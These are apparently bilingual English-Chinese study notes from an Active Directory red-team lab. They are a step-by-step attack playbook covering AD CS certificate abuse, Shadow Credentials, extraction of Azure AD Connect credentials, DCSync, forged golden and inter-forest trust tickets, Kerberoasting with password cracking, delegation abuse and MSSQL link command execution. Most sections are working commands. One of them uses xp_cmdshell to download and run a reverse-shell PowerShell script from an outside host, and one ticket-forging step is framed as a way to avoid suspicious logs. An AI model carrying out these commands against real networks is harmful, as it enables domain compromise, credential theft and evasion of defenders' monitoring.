# AD CS

## 什么是域证书服务

• Active Directory Certificate Services (AD CS) enables use of Public Key Infrastructure (PKI) in active directory forest.（活动目录证书服务（AD CS）可以在活动目录森林中使用公钥基础设施（PKI）。）
• AD CS helps in authenticating users and machines, encrypting and signing documents, filesystem, emails and more.（AD CS有助于验证用户和机器，加密和签署文件、文件系统、电子邮件等。）
• "AD CS is the Server Role that allows you to build a public key infrastructure (PKI) and provide public key cryptography, digital certificates, and digital signature capabilities for your organization."（"AD CS是服务器角色，它允许你建立一个公钥基础设施（PKI），并为你的组织提供公钥密码学、数字证书和数字签名功能。"）


## 相关术语

• CA - The certification authority that issues certificates. The server with AD CS role (DC or separate) is the CA.（颁发证书的认证机构。具有AD CS角色的服务器（DC或独立）是CA。）
• Certificate - Issued to a user or machine and can be used for authentication,encryption, signing etc.（颁发给用户或机器，可用于认证、加密、签名等。）
• CSR - Certificate Signing Request made by a client to the CA to request a certificate.（客户端向CA申请证书的证书签名请求）
• Certificate Template - Defines settings for a certificate. Contains information like - enrolment permissions, EKUs, expiry etc.（定义证书的设置。包含的信息有：注册权限、EKU、过期等。）
• EKU OIDs - Extended Key Usages Object Identifiers. These dictate the use of a certificate template (Client authentication, Smart Card Logon, SubCA etc.)（扩展密钥使用对象标识符。这些决定了证书模板的使用（客户认证、智能卡登录、子CA等）。）


## 利用思路
• There are various ways of abusing ADCS! (See the link to "Certified Pre-Owned" paper in slide notes):
– Extract user and machine certificates（提取用户或者机器的证书）
– Use certificates to retrieve NTLM hash（利用证书恢复NTLM哈希）
– User and machine level persistence（用户和机器层级的权限维持）
– Escalation to Domain Admin and Enterprise Admin（权限提升到 Domain Admin和Enterprise Admin）
– Domain persistence(域权限维持)


## 方法

### Stealing Certificates

1. THEFT1 Export certs with private keys using Windows' crypto APIs
2. THEFT2 Extracting user certs with private keys using DPAPI
3. THEFT3 Extracting machine certs with private keys using DPAPI
4. THEFT4 Steal certificates from files and stores
5. THEFT5 Use Kerberos PKINIT to get NTLM hash


### Persistence

1. PERSIST1 User persistence by requesting new certs
2. PERSIST2 Machine persistence by requesting new certs
3. PERSIST3 User/Machine persistence by renewing certs

### Escalation 

1. ESC1 Enrolee can request cert for ANY user
2. ESC2 Any purpose or no EKU (potentially dangerous)
3. ESC3 Request an enrollment agent certificate and use it to request cert on behalf of ANY user
4. ESC4 Overly permissive ACLs on templates
5. ESC5 Poor access control on CA server, CA server computer object etc.
6. ESC6 EDITF_ATTRI BUTESUBJE CTALTNAME 2 setting on CA -Request certs for ANY user
7. ESC7 Poor access control on roles on CA authority like "CA Administrator" and "Certificate Manager"
8. ESC8 NTLM relay to HTTP enrollment endpoints

### Domain Persistence

1. DPERSIST1 Forge certificates with stolen CA private keys
2. DPERSIST2 Malicious root/interm ediate CAs
3. DPERSIST3 Backdoor CA Server,CA server computer object etc.



## 枚举

使用[Certify.exe](https://github.com/GhostPack/Certify)

枚举证书
```
Certify.exe cas
```
枚举模板
```
Certify.exe find
```
枚举可以利用的模板
```
Certify.exe find /vulnerable

Certify.exe find /enrolleeSuppliesSubject
```


• Common requirements/misconfigurations for all the Escalations（导致权限提升的要求或者错误配置）

– CA grants normal/low-privileged users enrollment rights(CA授予正常/低权限的用户注册权限)
– Manager approval is disabled（Manager approval被禁用）
– Authorization signatures are not required（不需要授权签名）
– The target template grants normal/low-privileged users enrollment rights（目标模板授予普通/低权限的用户注册权限）


使用模板请求tgt
```
C:\AD\Tools\Rubeus.exe asktgt /user:pawadmin /certificate:C:\AD\Tools\pawadmin.pfx /password:SecretPass@123 /nowrap /ptt
```

## 为DA申请证书
```
C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
```

pfx转换成pem证书
```
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\DA.pfx
```

请求DA tgt,并且注入到当前进程
```
C:\AD\Tools\Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\DA.pfx /password:SecretPass@123 /nowrap /ptt
```

## 为EA申请证书

```
C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
```
pfx转换成pem证书
```
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\EA.pfx
```

请求EA tgt,并且注入到当前进程
```
C:\AD\Tools\Rubeus.exe asktgt /user:techcorp.local\Administrator /dc:techcorp-dc.techcorp.local /certificate:C:\AD\Tools\EA.pfx /password:SecretPass@123 /nowrap /ptt
```


# Shadow Credentials

## 是什么？

• Users and Computers have msDS-KeyCredentialLink attribute that contains the raw public keys of certificate that can be used as an alternate credential.（用户和计算机有msDS-KeyCredentialLink属性，该属性包含可用作替代凭证的证书的原始公钥。）
• This attribute is used when we configure Windows Hello for Business (WHfB)（这个属性在我们配置Windows Hello for Business（WHFB）时使用）
• By default, Key Admins and Enterprise Key Admins have rights to modify the msDS-KeyCredentialLink attribute.（默认情况下，密钥管理员和企业密钥管理员有权利修改msDS-KeyCredentialLink属性。）


## 利用条件
• User to User (U2U) Service Ticket can be requested to decrypt the encrypted NTLM_SUPPLEMENTAL_CREDENTIAL entity from Privilege Attribute Certificate (PAC) and extract NTLM hash.（可以请求用户对用户（U2U）服务票，从特权属性证书（PAC）中解密加密的NTLM_SUPPLEMENTAL_CREDENTIAL实体，并提取NTLM哈希。）

• Pre-requisites to abuse Shadow Credentials:
- AD CS (Key Trust if AD CS is not present)（AD CS（如果不存在AD CS，则需要密钥信任））
- Support for PKINIT and at least one DC with Windows Server 2016 or above.（支持PKINIT和至少一个Windows Server 2016或以上版本的DC）
- Permissions (GenericWrite/GenericAll) to modify the msDS-KeyCredentialLink attribute of the target object.（有权限（GenericWrite/GenericAll）来修改目标对象的msDS-KeyCredentialLink属性。）

## Abusing User Object（用户对象）

枚举权限
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}
```

添加 Shadow凭据
```
Whisker.exe add /target:supportXuser
```

Using PowerView, see if the Shadow Credential is added.
```
Get-DomainUser -Identity supportXuser
```

Request the TGT by leveraging the certificate.
```
Rubeus.exe asktgt /user:supportXuser /certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCW.... /password:"1OT0qAom3..." /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /getcredentials /show /nowrap
```
Inject the TGT in the current session or use the NTLM hash
```
Rubeus.exe ptt /ticket:doIGgDCCBnygAwIBBaEDAgEW...
```

## Abusing Computer Object（机器对象）

枚举权限
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'mgmtadmin’}
```
添加 Shadow凭据
```
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:mgmtadmin /domain:us.techcorp.local /aes256:32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f /run:cmd.exe" "exit"
```

```
Whisker.exe add /target:us-helpdesk$
```

Using PowerView, see if the Shadow Credential is added.
```
Get-DomainComputer -Identity us-helpdesk
```

Request the TGT by leveraging the certificate.
```
Rubeus.exe asktgt /user:us-helpdesk$ /certificate:MIIJ0AIBAzCCCYwGCSqGSIb... /password:"ViGFoZJa..." /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /getcredentials /show
```

Request and Inject the TGS by impersonating the user.
```
Rubeus.exe s4u /dc:us-dc.us.techcorp.local /ticket:doIGkDCCBoygAwIBBaEDAgEW... /impersonateuser:administrator /ptt /self /altservice:cifs/us-helpdesk
```

# Attacking Azure AD Integration

• An on-premises AD can be integrated with Azure AD using Azure AD Connect with the following methods:(使用Azure AD Connect，可以用以下方法将企业内部的AD与Azure AD集成。)

– Password Hash Sync (PHS)(密码哈希同步（PHS）)
– Pass-Through Authentication (PTA)(Pass-Through认证（PTA）)
– Federation(联盟？)

• Azure AD Connect is installed on-premises and has a high privilege account both in on AD and Azure AD!（Azure AD Connect安装在企业内部，在AD和Azure AD中都有一个高权限的账户!）


##  PHS

• It shares users and their password hashes from on-premises AD to Azure AD.（它将用户和他们的密码哈希值从企业内部的AD共享到Azure AD）
• A new users MSOL_ is created which has Synchronization rights (DCSync) on the domain!（一个新的用户MSOL_被创建，它在域上有同步的权利（DCSync）!）


枚举PHS账户和安装AD连接的服务器

使用PowerView
```
Get-DomainUser -Identity "MSOL_*" -Domain techcorp.local
```
使用ActiveDirectory module
```
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Server techcorp.local -Properties * | select SamAccountName,Description | fl
```

- 我们已经以helpdeskadmin的身份对我们的adconnect有管理权限。
- 有了管理权限，如果我们运行adconnect.ps1，我们可以提取AD Connect使用的MSOL_账户的明文凭证
```
.\adconnect.ps1
```

With the password, we can run commands as MSOL_
```
runas /user:techcorp.local\MSOL_16fb75d0227d /netonly cmd
```

can execute the DCSync attack
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'

Invoke-Mimikatz -Command '"lsadump::dcsync /user:techcorp\krbtgt /domain:techcorp.local"'
```
# Forest Root

• sIDHistory is a user attribute designed for scenarios where a user is moved from one domain to another. When a user's domain is changed,they get a new SID and the old SID is added to sIDHistory.（sIDHistory 是为用户从一个域移动到另一个域的场景设计的用户属性。 当用户的域发生变化时，他们会得到一个新的 SID，旧的 SID 会被添加到 sIDHistory。）

• sIDHistory can be abused in two ways of escalating privileges within a forest:（sIDHistory 可以通过两种方式在林中提升权限：）
– krbtgt hash of the child
– Trust tickets

• All the Privilege Escalation to techcorp.local we have seen till now needs some misconfiguration. These ones are 'working as intended'.（到目前为止，我们遇到所有导致域权限提升的问题都是因为错误配置。但是sIDHistory的利用是符合预期的利用）

## Child to Forest Root-Trust Key

枚举 [In] trust key

```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName us-dc
```
或者
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\techcorp$"'
```
或者
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

请求一个跨域的TGT
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-
3701854478-2406986946-519 /rc4:b59ef5860ce0aa12429f4f61c8e51979 /user:Administrator /service:krbtgt /target:techcorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi"'
```

使用Kekeo，根据上面的tgt，请求一个CIFS的tgs
```
tgs::ask /tgt:C:\AD\Tools\trust_tkt.kirbi /service:CIFS/techcorp-dc.techcorp.local
```

老版本的kekeo用下面命令
```
.\asktgs.exe C:\AD\Tools\trust_tkt.kirbi CIFS/techcorp-dc.techcorp.local
```
**其他服务的票证（例如 WMI 的 HOST 和 RPCSS，HTTP 的PowerShell Remoting 和 WinRM）也可以创建。**

使用上面的tgs，访问父域（可能需要两次）
```
misc::convert lsa TGS_Administrator@us.techcorp.local_krbtgt~TECHCORP.LOCAL@US.TECHCORP.LOCAL.kirbi
```
或者
```
.\kirbikator.exe lsa .\CIFS.techcorp-dc.techcorp.local.kirbi
```

或者使用Rubeus导入TGS
```
.\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:cifs/techcorp-dc.techcorp.local /dc:techcorp-dc.techcorp.local /ptt
```

验证
```
ls \\techcorp-dc.techcorp.local\c$
```

## Child to Forest Root -krbtgt

1. 这里使用krbtgt的哈希可以直接ptt，无需再申请tgs，省略了一步

abuse sIDhistory once again
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /ptt"'
```

验证
```
ls \\techcorp-dc.techcorp.local\C$
```
进入
```
Enter-PSSession techcorp-dc.techcorp.local
```

2. Avoid suspicious logs by using Domain Controllers group（使用域控制器组避免可疑日志）

```
Invoke-Mimikatz -Command '"kerberos::golden /user:us-dc$ /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /groups:516 /krbtgt:b0975ae49f441adc6b024ad238935af5 /sids:S-1-5-21-2781415573-3701854478-2406986946-516,S-1-5-9 /ptt"'
```

S-1-5-21-2578538781-2508153159-3419410681-516 – Domain Controllers

S-1-5-9 – Enterprise Domain Controllers

最后导出DA哈希
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:techcorp\Administrator /domain:techcorp.local"'
```

# Kerberoast

• It is possible to execute Kerberoast across Forest trusts.(可以跨森林信任执行Kerberoast。)
• Let's enumerate named service accounts across forest trusts(列举跨森林信任的命名服务账户)

PowerView
```
Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} | %{Get-DomainUser -SPN -Domain $_.TargetName}
```

ActiveDirectory Module
```
Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server $_.Name}
```

请求tgs
```
C:\AD\Tools\Rubeus.exe kerberoast /user:storagesvc /simple /domain:eu.local /outfile:euhashes.txt
```

Check for the TGS
```
klist
```
Crack using John
```
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

Request TGS across trust using PowerShel
```
Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList MSSQLSvc/eu-file.eu.local@eu.local
```

# Privilege Escalation – Constrained Delegation with Protocol Transition（域权限提升，约束委派与协议转换）

• The classic Constrained Delegation does not work across forest trusts.（经典的约束委派不适用于跨林信任）
• But we can abuse it once we have a beachhead/foothold across forest trust（但是一旦我们获得了立足点，我们就可以滥用它）

PowerView
```
Get-DomainUser –TrustedToAuth -Domain eu.local

Get-DomainComputer –TrustedToAuth -Domain eu.local
```

ActiveDirectory module:
```
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -Server eu.local
```

我们可以使用 Rubeus 请求alternate ticket
```
C:\AD\Tools\Rubeus.exe hash /password:Qwerty@2019 /user:storagesvc /domain:eu.local
```

然后使用s4u模块，请求一个ldap服务的tgs
```
C:\AD\Tools\Rubeus.exe s4u /user:storagesvc /rc4:5C76877A9C454CDED58807C20C20AEAC /impersonateuser:Administrator /domain:eu.local /msdsspn:nmagent/eu-dc.eu.local /altservice:ldap /dc:eu-dc.eu.local /ptt
```

Abuse the TGS to LDAP:
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:eu\krbtgt /domain:eu.local"'
```

或者
```
C:\AD\Tools\SharpKatz.exe --Command dcsync --User eu\krbtgt --Domain eu.local --DomainController eu-dc.eu.local


C:\AD\Tools\SharpKatz.exe --Command dcsync --User eu\administrator --Domain eu.local --DomainController eu-dc.eu.local
```


# Cross Forest Attacks - Unconstrained Delegation（跨林信任攻击，无约束委派）


• Recall the Printer bug and its abuse from a machine with Unconstrained Delegation.（回顾一下Printer bug，以及它在一台具有无约束授权的机器上的滥用。）、

• We have used it to escalate privileges to Domain Admin and Enterprise Admin.（我们已经用它将权限升级到DA和EA）

• It also works across a Two-way forest trust with TGT Delegation enabled!(在启用TGT授权的情况下，它也适用于在双向森林信任中)

• TGT Delegation is disabled by default and must be explicitly enabled across a trust for the trusted (target) forest.（TGT 委派在默认情况下处于禁用状态，并且必须跨信任（目标）林的信任显式启用。）

• In the lab, TGTDelegation is set from usvendor.local to techcorp.local (but not set for the other direction).（在实验室中，将 TGTDelegation 从 usvendor.local 设置为 techcorp.local（但未设置为其他方向）。）


要枚举是否跨林信任启用了 TGTDelegation，请从 DC 运行以下命令
```
netdom trust trustingforest /domain:trustedforest /EnableTgtDelegation
```

在lab里，下面命令在usvendor-dc中运行
```
netdom trust usvendor.local /domain:techcorp.local /EnableTgtDelegation
```

在lab里使用下面powerview命令会报错，但理论上应该是可以执行的
```
Get-ADTrust -server usvendor.local -Filter *
```

# Trust Key

• By abusing the trust flow between forests in a two way trust, it is possible to access resources across the forest boundary.（ 通过在双向信任中滥用森林之间的信任流，就有可能跨越森林边界访问资源。）

• We can use the Trust Key, the same way as in Domain trusts but we can access only those resources which are explicitly shared with our current forest.（我们可以使用信任密钥，与域信任中的方式相同，但我们只能访问那些与我们当前森林明确共享的资源。）

• Let's try to access a file share 'eushare' on euvendor-dc of euvendor.local forest from eu.local which is explicitly shared with Domain Admins of eu.local.（让我们尝试从eu.local访问euvendor.local森林的euvendor-dc上的一个文件共享 "eushare"，这个文件共享是明确地与eu.local的域管理员共享）

• Note that we are hopping trusts from us.techcrop.local to eu.local to euvendor.local!（请注意，我们是在从us.techcrop.local到eu.local再到euvendor.local之间跳过信任。）


枚举林的秘钥
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
```

or
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:eu\euvendor$"'
```

or
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

请求一个森林间的tgt
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:799a0ae7e6ce96369aa7f1e9da25175a /service:krbtgt /target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-519 /ticket:C:\AD\Tools\kekeo_old\sharedwitheu.kirbi"'
```

通过上面伪造的tgt为目标森林中的服务（下面是CIFS）获取TGS。
```
.\asktgs.exe C:\AD\Tools\kekeo_old\sharedwitheu.kirbi CIFS/euvendor-dc.euvendor.local
```

**其他服务的门票（如WMI的HOST和RPCSS，PowerShell Remoting和WinRM的HOST和HTTP PowerShell Remoting和WinRM）也可以被创建。**

利用上面请求到的tgs
```
.\kirbikator.exe lsa CIFS.euvendor-dc.euvendor.local.kirbi


ls \\euvendor-dc.euvendor.local\eushare\
```

也可以使用Rubeus
```
C:\Users\Public\Rubeus.exe asktgs /ticket:C:\Users\Public\sharedwitheu.kirbi /service:CIFS/euvendor-dc.euvendor.local /dc:euvendor-dc.euvendor.local /ptt
```

为什么我们不能访问林内的所有资源？


SID Filtering is the answer. It filters high privilege SIDs from the SIDHistory of a TGT crossing forest boundary. This means we cannot just go ahead and access resources in the trusting forest as an Enterprise Admin.（答案就是SID Filtering，它从跨越森林边界的TGT的SIDHistory中过滤高权限的SID。这意味着我们不能像Enterprise Admin一样去访问信任森林中的资源。）


• But there is a catch:

S-1-5-21-<Domain>-R
R >= 1000

Identifiers for end user-created domain identities and domain groups.

Not filtered at domain and external trust boundaries. Can be filtered at member, quarantined, and cross-forest boundaries.

See the filtering pattern table [here](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)

This means, if we have an external trust (or a forest trust with SID history enabled -/enablesidhistory:yes), we can inject a SIDHistory for RID > 1000 to access resources accessible to that identity or group in the target trusting forest.（这意味着，如果我们有一个外部信任（或启用了 SID 历史记录的林信任 -/enablesidhistory:yes），我们可以为 RID > 1000 注入一个 SIDHistory 以访问目标信任林中该身份或组可访问的资源。）


We had DA access to eu.local. Let's enumerate trusts from a PSRemoting session on eu-dc:
```
Get-ADTrust -Filter *
```

• SIDFilteringForestAware is set to True, it means SIDHistory is enabled across the forest trust.(SIDFilteringForestAware 设置为True，这意味着SIDHistory 跨森林信任启用。)
• Please remember that still only RID > 1000 SIDs will be allowed across the trust boundary.(请记住，仍然只允许 RID > 1000 SID 跨越信任边界。)

```
Get-ADGroup -Identity EUAdmins -Server euvendor.local
```

在eu-dc，使用 EUAdmins 组的 SIDHistory 创建一个 TGT
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:799a0ae7e6ce96369aa7f1e9da25175a /service:krbtgt /target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /ticket:C:\Users\Public\euvendornet.kirbi"'
```

上面tgt，请求 TGS
```
.\asktgs.exe C:\Users\Public\euvendornet.kirbi HTTP/euvendor-net.euvendor.local
```

注入到当前session
```
.\kirbikator.exe lsa HTTP.euvendor-net.euvendor.local.kirbi
```
或者
```
C:\Users\Public\Rubeus.exe asktgs /ticket:C:\Users\Public\euvendornet.kirbi /service:HTTP/euvendor-net.euvendor.local /dc:euvendor-dc.euvendor.local /ptt
```

使用 PSRemoting 访问 euvendor-net 机器
```
Invoke-Command -ScriptBlock{whoami} -ComputerName euvendor-net.euvendor.local -Authentication NegotiateWithImplicitCredential
```

# Trust Abuse - MSSQL Servers

使用[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

Discovery (SPN Scanning)
```
Get-SQLInstanceDomain
```

Check Accessibility
```
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

Gather Information
```
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

##  Database Links

寻找远程服务器的sql链接
```
Get-SQLServerLink -Instance us-mssql.us.techcorp.local -Verbose
```

**查找所有链接**
```
select * from master..sysservers
```

Openquery 函数可用于在链接数据库上运行查询
```
select * from openquery("192.168.23.25",'select * from master..sysservers')
```

可以链接 Openquery 查询以访问链接内的链接（嵌套链接）
```
select * from openquery("192.168.23.25 ",'select * from openquery("db-sqlsrv",''select @@version as version'')')
```

### Executing Commands（命令执行）

• On the target server, either xp_cmdshell should be already enabled; or
• If rpcout is enabled (disabled by default), xp_cmdshell can be enabled using

```
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "db-sqlsrv"
```

From the initial SQL server, OS commands can be executed using nested link queries（从初始 SQL 服务器，可以使用嵌套链接查询执行操作系统命令）
```
select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''select @@version as version;exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''''http://192.168.100.X/Invoke-PowerShellTcp.ps1'''')"'')')
```

### 爬取远程服务器的链接
```
Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local
```

Abusing links to remote servers (without -QueryTarget the command tries to use xp_cmdshell on every link of the chain)（滥用远程服务器上的链接（尝试在每个链接下使用xp_cmdshell））
```
Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query 'exec master..xp_cmdshell' 'whoami''' -QueryTarget db-sqlsrv
```

# Foreign Security Principals


• A Foreign Security Principal (FSP) represents a Security Principal in a external forest trust or special identities (like Authenticated Users,Enterprise DCs etc.).（外部安全主体 (FSP) 代表外部林信任或特殊身份（如经过身份验证的用户、企业 DC 等）中的安全主体。）

• Only SID of a FSP is stored in the Foreign Security Principal Container which can be resolved using the trust relationship.（只有FSP 的SID 存储在可以使用信任关系解析的外部安全主体容器中。）

• FSP allows external principals to be added to domain local security groups. Thus, allowing such principals to access resources in the forest.（FSP 允许将外部主体添加到域本地安全组。 因此，允许此类主体访问森林中的资源。）

• Often, FSPs are ignored, mis-configured or too complex to change/cleanup in an enterprise making them ripe for abuse.（通常，FSP 被忽略、配置错误或过于复杂而无法在企业中更改/清理，从而使它们成为滥用的时机。）


## 枚举 FSPs

PowerView:
```
Find-ForeignGroup -Verbose
Find-ForeignUser -Verbose
```

ActiveDirectory module:
```
Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"}
```

# ACLs

• Access to resources in a forest trust can also be provided without using FSPs using ACLs.(也可以在不使用FSP 的情况下通过ACL 提供对森林信任中资源的访问。)

• Principals added to ACLs do NOT show up in the ForeignSecurityPrinicpals container as the container is populated only when a principal is added to a domain local security group.(添加到ACL 的主体不会显示在ForeignSecurityPrinicpals 容器中，因为仅在将主体添加到域本地安全组时才会填充容器。)

枚举
```
Find-InterestingDomainAcl -Domain dbvendor.local
```

# Abusing PAM Trust

• PAM trust is usually enabled between a Bastion or Red forest and a production/user forest which it manages.（PAM信任通常在Bastion或Red森林和它所管理的生产/用户森林之间启用。）

• PAM trust provides the ability to access the production forest with high privileges without using credentials of the bastion forest. Thus, better security for the bastion forest which is much desired.（PAM信任提供了以高权限访问生产林的能力，而无需使用堡垒林的凭证。因此，堡垒林的安全性更好，这是人们所期望的）

• To achieve the above, Shadow Principals are created in the bastion domain which are then mapped to DA or EA groups SIDs in the production forest.（ 为了实现上述目标，在堡垒域中创建影子原则，然后将其映射到生产林中的DA或EA组SID。）

##枚举
```
Get-ADTrust -Filter *

Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastion.local
```

On bastion-dc, enumerate if there is a PAM trust
```
$bastiondc = New-PSSession bastion-dc.bastion.local Invoke-Command -ScriptBlock {Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}} -Session $bastiondc
```

Check which users are members of the Shadow Principals:
```
Invoke-Command -ScriptBlock {Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl} -Session $bastiondc
```

## Abusing PAM Trust

Establish a direct PSRemoting session on bastion-dc and access production.local:
```
Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential
```
